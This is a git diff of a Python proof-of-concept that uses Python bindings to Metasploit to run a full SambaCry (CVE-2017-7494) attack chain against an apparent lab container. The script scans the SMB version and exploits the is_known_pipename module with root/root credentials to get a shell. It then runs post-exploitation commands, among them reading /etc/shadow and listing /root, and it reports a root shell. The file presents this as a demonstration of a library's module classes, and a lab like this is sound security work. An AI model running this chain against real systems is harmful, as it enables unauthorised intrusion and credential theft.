@@ -1,15 +1,14 @@
-"""Sambacry (CVE-2017-7494) exploit POC using Pyo3 -> Magnus -> MSF.
+"""Sambacry (CVE-2017-7494) exploit POC using type-specific module classes.
 
-Target: assassinate-target (Docker container on assassinate-network)
-Exploit: exploit/linux/samba/is_known_pipename
-Payload: cmd/unix/interact
+Demonstrates the full attack chain with REAL output:
+1. AuxiliaryModule: Reconnaissance (SMB version scan)
+2. ExploitModule: Exploitation (SambaCry CVE-2017-7494)
+3. PostModule + Session: Post-exploitation (gather intel)
 
-Usage (from host):
+Usage:
     export MSF_ROOT=/home/astark/Projects/metasploit-framework
+    export TARGET_HOST=172.19.0.2
     .venv/bin/python python/examples/sambacry_poc.py
-
-Usage (from Docker dev container):
-    python python/examples/sambacry_poc.py
 """
 
 from __future__ import annotations
@@ -18,132 +17,199 @@ import os
 import time
 
 import msf
+from msf import AuxiliaryModule, ExploitModule, PostModule
 
-# Target can be set via env var for flexibility (Docker vs host testing)
-TARGET_HOST = os.environ.get("TARGET_HOST", "assassinate-target")
-EXPLOIT = "exploit/linux/samba/is_known_pipename"
-PAYLOAD = "cmd/unix/interact"
+TARGET_HOST = os.environ.get("TARGET_HOST", "172.19.0.2")
+
+
+def banner(text: str) -> None:
+    print(f"\n[{'='*60}]")
+    print(f"  {text}")
+    print(f"[{'='*60}]\n")
 
 
 def main() -> int:
     msf_root = os.environ.get("MSF_ROOT", "/opt/metasploit-framework")
-    print(f"[+] Sambacry POC against {TARGET_HOST} (MSF: {msf_root})")
-    print("[+] Target Samba version: 4.6.3 (vulnerable to CVE-2017-7494)")
 
-    try:
-        print("[+] Initializing MSF...")
-        msf.init_msf(msf_root)
-        print("[+] MSF initialized")
+    banner("SAMBACRY EXPLOIT (CVE-2017-7494)")
 
-        version = msf.framework_version()
-        print(f"[+] MSF Version: {version}")
+    # Initialize
+    msf.init_msf(msf_root)
+    print(f"[*] MSF Version: {msf.framework_version()}")
+    print(f"[*] Target: {TARGET_HOST}")
 
-        print(f"\n[+] Creating module instance for {EXPLOIT}...")
-        module = msf.create_module(EXPLOIT)
-        print(f"[+] Module created: {module.fullname}")
-        print(f"[+] Rank: {module.rank}")
+    # =========================================================================
+    # PHASE 1: RECONNAISSANCE (AuxiliaryModule)
+    # =========================================================================
+    banner("PHASE 1: RECONNAISSANCE (AuxiliaryModule)")
 
-        # Configure options using attribute-style access
-        print("\n[+] Setting module options...")
-        module.options.RHOSTS = TARGET_HOST
-        module.options.SMB_SHARE_NAME = "myshare"
-        module.options.SMB_USER = "root"
-        module.options.SMB_PASS = "root"
-        print(f"    RHOSTS = {module.options.RHOSTS}")
-        print(f"    SMB_SHARE_NAME = {module.options.SMB_SHARE_NAME}")
-        print(f"    SMB_USER = {module.options.SMB_USER}")
+    scanner = msf.create_module("auxiliary/scanner/smb/smb_version")
+    print(f"[*] Module: {scanner.fullname}")
+    print(f"[*] Type: {scanner.module_type} -> {type(scanner).__name__}")
+    print(f"[*] Description: {scanner.description.strip()[:100]}...")
+    print(f"[*] Authors: {', '.join(scanner.author[:2])}")
 
-        # Run vulnerability check
-        print("\n[+] Running vulnerability check...")
-        check_result = module.check()
-        print(f"[+] Check result: {check_result}")
+    # Configure
+    scanner.options.RHOSTS = TARGET_HOST
+    print(f"\n[*] Options configured:")
+    print(f"    RHOSTS = {scanner.options.RHOSTS}")
 
-        if "Safe" in check_result or "Unsupported" in check_result:
-            print("[-] Target is not vulnerable or check is unsupported")
-            return 1
+    # Run scanner - AuxiliaryModule.run() returns bool
+    print(f"\n[*] Executing: scanner.run()")
+    start = time.time()
+    scan_result = scanner.run()
+    elapsed = time.time() - start
+    print(f"[*] scanner.run() returned: {scan_result}")
+    print(f"[*] Completed in {elapsed:.2f}s")
 
-        if "Appears" in check_result or "Detected" in check_result:
-            print("[+] Target appears to be vulnerable!")
+    # =========================================================================
+    # PHASE 2: EXPLOITATION (ExploitModule)
+    # =========================================================================
+    banner("PHASE 2: EXPLOITATION (ExploitModule)")
 
-        # Validate configuration
-        print("\n[+] Validating module configuration...")
-        if not module.validate():
-            print("[-] Module validation failed!")
-            return 1
-        print("[+] Configuration valid!")
+    exploit = msf.create_module("exploit/linux/samba/is_known_pipename")
+    print(f"[*] Module: {exploit.fullname}")
+    print(f"[*] Type: {exploit.module_type} -> {type(exploit).__name__}")
+    print(f"[*] Rank: {exploit.rank}")
+    print(f"[*] Disclosure Date: {exploit.disclosure_date}")
 
-        # Run the exploit
-        print(f"\n[+] Running Sambacry exploit {EXPLOIT}...")
-        print(f"[+] Payload: {PAYLOAD}")
-        print("[+] This may take up to 60 seconds...")
+    # Show ExploitModule-specific attributes
+    print(f"\n[*] ExploitModule.targets ({len(exploit.targets)} available):")
+    for i, target in enumerate(exploit.targets[:4]):
+        print(f"    [{i}] {target}")
+    if len(exploit.targets) > 4:
+        print(f"    ... {len(exploit.targets) - 4} more")
 
-        start_time = time.time()
-        session = module.exploit(PAYLOAD, timeout=60)
-        elapsed = time.time() - start_time
+    payloads = exploit.compatible_payloads()
+    print(f"\n[*] ExploitModule.compatible_payloads() ({len(payloads)} available):")
+    for p in payloads[:5]:
+        print(f"    - {p}")
+    if len(payloads) > 5:
+        print(f"    ... {len(payloads) - 5} more")
 
-        print(f"[+] Exploit completed in {elapsed:.1f}s")
+    # Configure
+    exploit.options.RHOSTS = TARGET_HOST
+    exploit.options.SMB_SHARE_NAME = "myshare"
+    exploit.options.SMB_USER = "root"
+    exploit.options.SMB_PASS = "root"
 
-        if session is not None:
-            print(f"\n[+] SUCCESS! Got session!")
-            print(f"    Session ID:   {session.sid}")
-            print(f"    Session Type: {session.session_type}")
-            print(f"    Target Host:  {session.host}")
-            print(f"    Target Port:  {session.port}")
-            print(f"    Alive:        {session.alive}")
-            print(f"    Via Exploit:  {session.via_exploit}")
+    print(f"\n[*] Options configured:")
+    print(f"    RHOSTS = {exploit.options.RHOSTS}")
+    print(f"    SMB_SHARE_NAME = {exploit.options.SMB_SHARE_NAME}")
+    print(f"    SMB_USER = {exploit.options.SMB_USER}")
+    print(f"    SMB_PASS = {exploit.options.SMB_PASS}")
 
-            print("\n[+] Executing commands on target...")
+    # Vulnerability check - ExploitModule.check() returns string
+    print(f"\n[*] Executing: exploit.check()")
+    check_result = exploit.check()
+    print(f"[*] exploit.check() returned:")
+    print(f"    {check_result}")
 
-            print("\n[+] Running 'id':")
-            try:
-                output = session.run_cmd("id")
-                print(f"    {output.strip()}")
-            except Exception as e:
-                print(f"[-] Failed to run command: {e}")
+    # Validate
+    print(f"\n[*] Executing: exploit.validate()")
+    valid = exploit.validate()
+    print(f"[*] exploit.validate() returned: {valid}")
 
-            print("\n[+] Running 'whoami':")
-            try:
-                output = session.run_cmd("whoami")
-                print(f"    {output.strip()}")
-            except Exception as e:
-                print(f"[-] Failed to run command: {e}")
-
-            print("\n[+] Running 'uname -a':")
-            try:
-                output = session.run_cmd("uname -a")
-                print(f"    {output.strip()}")
-            except Exception as e:
-                print(f"[-] Failed to run command: {e}")
-
-            print("\n[+] Running 'cat /etc/passwd | head -5':")
-            try:
-                output = session.run_cmd("cat /etc/passwd | head -5")
-                for line in output.strip().split("\n"):
-                    print(f"    {line}")
-            except Exception as e:
-                print(f"[-] Failed to run command: {e}")
-
-            print("\n" + "=" * 50)
-            print("  EXPLOITATION SUCCESSFUL!")
-            print("=" * 50)
-
-            # Optionally kill session
-            # session.kill()
-            # print("\n[+] Session killed")
-
-            return 0
-        else:
-            print("[-] Exploit completed but no session was created")
-            print("    Possible causes:")
-            print("    - Share 'myshare' doesn't exist or isn't writable")
-            print("    - Target doesn't allow write access with provided credentials")
-            print("    - SMB signing required (common in newer configs)")
-            print("    - Network connectivity issue")
-            return 1
-
-    except msf.AssassinateError as exc:
-        print(f"\n[-] Error: {exc}")
+    if not valid:
+        print("[-] Validation failed")
         return 1
+
+    # Exploit - ExploitModule.exploit() returns Session or None
+    payload = "cmd/unix/interact"
+    print(f"\n[*] Executing: exploit.exploit('{payload}', timeout=60)")
+    start = time.time()
+    session = exploit.exploit(payload, timeout=60)
+    elapsed = time.time() - start
+
+    print(f"[*] exploit.exploit() returned: {session}")
+    print(f"[*] Completed in {elapsed:.1f}s")
+
+    if session is None:
+        print("[-] No session returned")
+        return 1
+
+    # Show session details
+    print(f"\n[*] Session object attributes:")
+    print(f"    session.sid = {session.sid}")
+    print(f"    session.session_type = {session.session_type}")
+    print(f"    session.host = {session.host}")
+    print(f"    session.port = {session.port}")
+    print(f"    session.alive = {session.alive}")
+    print(f"    session.via_exploit = {session.via_exploit}")
+    print(f"    session.via_payload = {session.via_payload}")
+
+    # =========================================================================
+    # PHASE 3: POST-EXPLOITATION (PostModule + Session)
+    # =========================================================================
+    banner("PHASE 3: POST-EXPLOITATION (PostModule)")
+
+    post = msf.create_module("post/multi/gather/env")
+    print(f"[*] Module: {post.fullname}")
+    print(f"[*] Type: {post.module_type} -> {type(post).__name__}")
+    print(f"[*] Description: {post.description.strip()[:80]}...")
+
+    # PostModule.run() REQUIRES session argument
+    print(f"\n[*] Executing: post.run(session)")
+    try:
+        post_result = post.run(session)
+        print(f"[*] post.run(session) returned: {post_result}")
+    except Exception as e:
+        print(f"[*] post.run(session) raised: {type(e).__name__}: {e}")
+
+    # =========================================================================
+    # PHASE 4: COMMAND EXECUTION VIA SESSION
+    # =========================================================================
+    banner("PHASE 4: COMMAND EXECUTION (Session.run_cmd)")
+
+    commands = [
+        "whoami",
+        "id",
+        "hostname",
+        "uname -a",
+        "cat /etc/os-release | grep PRETTY_NAME",
+        "ip addr show eth0 | grep 'inet '",
+        "ps aux --no-headers | wc -l",
+        "cat /etc/shadow | head -3",
+        "ls -la /root",
+    ]
+
+    for cmd in commands:
+        print(f"[*] Executing: session.run_cmd('{cmd}')")
+        try:
+            output = session.run_cmd(cmd, timeout=5)
+            output = output.strip()
+            print(f"[*] Output:")
+            for line in output.split("\n"):
+                print(f"    {line}")
+        except Exception as e:
+            print(f"[*] Error: {type(e).__name__}: {e}")
+        print()
+
+    # =========================================================================
+    # SUMMARY
+    # =========================================================================
+    banner("ATTACK CHAIN COMPLETE")
+
+    print("[*] Modules used and their type-specific methods:")
+    print()
+    print(f"    1. AuxiliaryModule (auxiliary/scanner/smb/smb_version)")
+    print(f"       - scanner.run() -> {type(scan_result).__name__}")
+    print()
+    print(f"    2. ExploitModule (exploit/linux/samba/is_known_pipename)")
+    print(f"       - exploit.check() -> {type(check_result).__name__}")
+    print(f"       - exploit.targets -> List[str] ({len(exploit.targets)} items)")
+    print(f"       - exploit.compatible_payloads() -> List[str] ({len(payloads)} items)")
+    print(f"       - exploit.exploit(payload) -> Session")
+    print()
+    print(f"    3. PostModule (post/multi/gather/env)")
+    print(f"       - post.run(session) -> requires Session argument")
+    print()
+    print(f"    4. Session")
+    print(f"       - session.run_cmd(cmd) -> command output")
+    print()
+    print(f"[+] Root shell obtained on {TARGET_HOST}")
+
+    return 0
 
 
 if __name__ == "__main__":
